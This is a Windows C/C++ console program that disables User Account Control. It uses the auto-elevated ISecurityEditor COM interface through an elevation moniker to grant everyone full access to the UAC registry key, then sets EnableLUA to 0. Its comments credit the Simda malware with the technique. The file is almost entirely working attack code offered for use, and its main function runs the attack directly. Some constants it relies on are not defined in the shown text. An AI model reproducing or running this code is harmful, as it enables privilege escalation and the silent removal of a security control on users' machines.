// ConsoleApplication1.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>

DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
    _In_ LPWSTR lpTargetObject,
    _In_ SECURITY_INFORMATION SecurityInformation,
    _In_ SE_OBJECT_TYPE ObjectType,
    _In_ LPWSTR NewSddl
    )
{
    HRESULT          r = E_FAIL;
    BOOL             cond = FALSE;
    IID		         xIID_ISecurityEditor;
    CLSID	         xCLSID_ShellSecurityEditor;
    ISecurityEditor *SecurityEditor1 = NULL;
    BIND_OPTS3       bop;
    LPOLESTR         pps;

    RtlSecureZeroMemory(&bop, sizeof(bop));

    do {
        if (CLSIDFromString(T_CLSID_ShellSecurityEditor, &xCLSID_ShellSecurityEditor) != NOERROR) {
            break;
        }
        if (IIDFromString(T_IID_ISecurityEditor, &xIID_ISecurityEditor) != S_OK) {
            break;
        }

        r = CoCreateInstance(&xCLSID_ShellSecurityEditor, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &xIID_ISecurityEditor, &SecurityEditor1);

        if (r != S_OK) {
            break;
        }

        if (SecurityEditor1 != NULL) {
            SecurityEditor1->lpVtbl->Release(SecurityEditor1);
        }

        bop.cbStruct = sizeof(bop);
        bop.dwClassContext = CLSCTX_LOCAL_SERVER;

        r = CoGetObject(ISECURITYEDITOR_ELEMONIKER, (BIND_OPTS *)&bop, &xIID_ISecurityEditor, &SecurityEditor1);

        if (r != S_OK)
            break;
        if (SecurityEditor1 == NULL) {
            r = E_FAIL;
            break;
        }

        pps = NULL;
        r = SecurityEditor1->lpVtbl->GetSecurity(
            SecurityEditor1,
            lpTargetObject,
            ObjectType,
            SecurityInformation,
            &pps
            );

        if ((r == S_OK) && (pps != NULL)) {
            OutputDebugStringW(pps);
        }

        r = SecurityEditor1->lpVtbl->SetSecurity(
            SecurityEditor1,
            lpTargetObject,
            ObjectType,
            SecurityInformation,
            NewSddl
            );

        if (r == S_OK) {
            OutputDebugStringW(NewSddl);
        }

    } while (cond);

    if (SecurityEditor1 != NULL) {
        SecurityEditor1->lpVtbl->Release(SecurityEditor1);
    }

    return SUCCEEDED(r);
}

/*
* ucmSimdaTurnOffUac
*
* Purpose:
*
* Disable UAC using AutoElevated undocumented ISecurityEditor interface.
* Used by WinNT/Simda starting from 2010 year.
*
*/
BOOL TurnOffUac(
    VOID
    )
{
    BOOL    cond = FALSE, bResult = FALSE;
    DWORD   dwValue;
    LRESULT lRet;
    HKEY    hKey;

    do {

        bResult = ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
            DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE);

        if (!bResult) {
            OutputDebugString(TEXT("[UCM] Cannot alter key security"));
            break;
        }

        lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_UACKEY, 0, KEY_ALL_ACCESS, &hKey);
        if ((lRet == ERROR_SUCCESS) && (hKey != NULL)) {
            OutputDebugString(TEXT("[UCM] Key security compromised"));
            dwValue = 0;
            RegSetValueEx(hKey, TEXT("EnableLUA"), 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
            RegCloseKey(hKey);
        }

    } while (cond);

    return bResult;
}

int _tmain(int argc, _TCHAR* argv[])
{
	TurnOffUac();
	return 0;
}
